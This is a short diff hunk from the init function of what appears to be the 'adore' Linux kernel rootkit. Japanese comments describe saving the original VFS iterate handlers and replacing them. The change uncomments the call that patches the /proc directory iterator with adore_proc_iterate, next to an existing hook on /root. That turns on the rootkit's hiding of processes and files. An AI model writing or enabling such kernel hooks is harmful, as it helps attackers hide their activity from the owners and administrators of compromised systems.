@@ -785,7 +785,7 @@ int __init adore_init(void)
 	
 
 	// "/proc"を開いて、Originalのiterateを保存しiterateをadore_proc_iterateに書き換え
-	//patch_vfs(proc_fs, &orig_proc_iterate, adore_proc_iterate);
+	patch_vfs(proc_fs, &orig_proc_iterate, adore_proc_iterate);
 	
 	// "/root"を開いて、Originalのiterateを保存しiterateをadore_root_iterateに書き換え
 	patch_vfs(root_fs, &orig_root_iterate, adore_root_iterate);
